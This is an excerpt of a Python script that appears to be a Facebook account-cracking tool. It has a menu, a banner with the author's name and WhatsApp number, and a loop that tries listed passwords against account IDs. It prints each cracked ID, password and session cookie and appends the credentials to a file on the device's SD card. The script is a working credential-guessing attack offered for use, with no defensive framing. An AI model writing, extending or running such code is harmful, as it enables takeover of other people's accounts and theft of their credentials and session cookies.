...
def o():
    ...
    if Mahin == '1':
        i()
    if Mahin == '2':
        os.system('xdg-open https://github.com/rafsun35 ')
    if Mahin == '3':
        os.system('xdg-open https://github.com/rafsun35 ')
    if Mahin == 'E':
        os.system('exit')
...
\033[1;32m  ╔═══════════════════════════════════════════════════╗
\033[1;97m  ╠══[Author:=======================> \33[1;38RAFSUN FARUQ \33[1;38m   ║
\033[1;32m  ╠══[Facebook:=====================> MD RAFSUN FARUQ      ║ 
\033[1;97m  ╠══[Whatsapp:=====================> 01537227118     ║
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[65:80]
                print('\033[38;5;46m[RAFSUN] ' +uid+ '|' +ps+    '  \n   \033[1;33mCOOKIES : \033[38;5;46m'+coki+ ' ')                
                open('/sdcard/RAFSUN.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[65:80]
                print('\033[38;5;46m[RAFSUN] ' +uid+ '|' +ps+ '  \33[0;97m')
                open('/sdcard/RAFSUN.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write('\r    \33[1;93m[\033[1;95mRAFSUN\033[0m/%s\33[1;93m]\033[1;97mOK-\033[38;5;46m%s'%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
